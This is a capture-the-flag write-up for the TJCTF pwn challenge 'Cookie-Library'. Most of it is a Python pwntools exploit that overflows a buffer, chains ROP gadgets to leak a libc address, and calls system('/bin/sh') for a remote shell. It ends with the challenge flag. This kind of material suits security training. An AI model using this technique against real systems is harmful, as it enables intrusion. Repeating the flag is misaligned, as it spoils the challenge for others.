# Cookie-Library
Pwn, 90

>  Written by KyleForkBomb
>  My friend loves cookies. In fact, she loves them so much her favorite cookie changes all the time. She said there's no reward for guessing her favorite cookie, but I still think she's hiding something.
>  
>  nc p1.tjctf.org 8010 

This challenge is very similar to stop (binary 70). The script is slightly modified to have the correct function/gadget addresses, and we can now use `gets` instead of the `read` function embedded in the stop binary.

```python
from pwn import *
import time

pop = 0x40094a
call = 0x400930
read = 0x4008e0
bss = 0x602000
getchar = 0x601fe8
pread = 0x400398
printf = 0x4005a0
rdi = 0x400953
main = 0x40073c

got = 0x601fe0

#p = process("./stop")
p = remote("p1.tjctf.org", 8001)
#gdb.attach(p)
p.sendline("a")
p.sendline("A"*256+"B"*24+p64(0x40056e)+p64(rdi)+p64(got)+p64(printf)+p64(pop)+p64(0)+p64(1)+p64(pread)+p64(0)+p64(bss)+p64(0x4141)+p64(call)+p64(0)+p64(0)+p64(1)+p64(bss+8)+p64(bss)+p64(0)+p64(0)+p64(0x40056e)+p64(call))
p.recvuntil("yet\n")
printf = u64(p.recvuntil("\x7f")+"\x00\x00")
system = printf-0x15a40
#system = printf-0xE2A0
print(hex(system))
p.sendline("/bin/sh\x00"+p64(system))
p.interactive()
```

Flag: `tjctf{c00ki3_yum_yum_mmMmMMmMMmmMm}`